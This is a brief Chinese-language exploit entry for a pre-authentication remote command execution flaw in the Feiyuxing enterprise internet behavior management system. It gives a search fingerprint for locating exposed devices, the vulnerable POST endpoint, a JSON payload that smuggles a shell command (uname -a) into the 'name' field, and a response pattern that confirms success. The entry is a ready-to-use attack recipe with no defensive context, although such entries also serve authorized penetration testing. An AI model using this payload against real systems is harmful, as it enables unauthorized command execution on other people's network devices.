# 飞鱼星上网行为管理系统企业版前台RCE

飞鱼星上网行为管理系统企业版前台 ｜ 命令执行 ｜ —
- **指纹**：`title="飞鱼星企业"`
- **请求**：`POST /send_order.cgi?parameter=operation HTTP/1.1`

**Payload**
```
{"opid":"777777777777777777","name":";uname -a;echo ","type":"rest"}
```
- **响应特征**：200 ^(?=.*?msg)(?=.*?ok).*?$